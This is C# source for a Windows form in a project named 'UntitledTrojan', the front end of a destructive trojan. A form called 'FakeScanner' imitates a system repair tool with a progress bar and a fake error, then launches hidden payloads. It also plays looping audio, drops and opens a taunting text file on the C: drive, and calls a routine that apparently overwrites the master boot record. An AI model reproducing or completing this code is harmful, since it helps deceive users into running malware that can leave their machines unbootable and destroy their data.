using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using UntitledTrojan.Payloads;
using UntitledTrojan.Properties;
using UntitledTrojan.Tools;

namespace UntitledTrojan
{
    public partial class FakeScanner : Form
    {
        private static Random random = new Random();
        private static bool startPayloads = false;

        public FakeScanner()
        {
            InitializeComponent();
        }

        private void progressBar1_Click(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void timer_Tick(object sender, EventArgs e)
        {
            if (startPayloads)
            {
                PayloadsManager.OnTick();
            }
            else
            {
                if (progressBar1.Value >= 95)
                {
                    timer.Stop();
                    MessageBox.Show("Cannot repair your system." +
                        "\nA program running in background is interfering with repairing process.",
                        "System Repair", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Opacity = 0;
                    startPayloads = true;
                    Process.Start("C:\\Windows\\System32\\explorer.exe");
                }
                else
                {
                    progressBar1.Value += 1;
                    timer.Interval = random.Next(200, 500);
                }

                SoundPlayer plr = new SoundPlayer(Resources.hardbass);
                plr.PlayLooping();
                timer.Interval = 1000;

                File.WriteAllText(@"C:\YOU GOT FUCKED.txt", "Your PC was fucked by Untitled Trojan!" +
                    "\n\nNow say \"Rest in pepperoni\" to your toaster!" +
                    "\nDo not try to reboot or close me! Your MBR already has been fucked!" +
                    "\n\nTry to use your PC as long as you can!");
                Process.Start(@"C:\YOU GOT FUCKED.txt");

                MBR.FuckMBR();
            }
        }

        private void FakeScanner_Load(object sender, EventArgs e)
        {
            timer.Enabled = true;
            timer.Start();
        }
    }
}
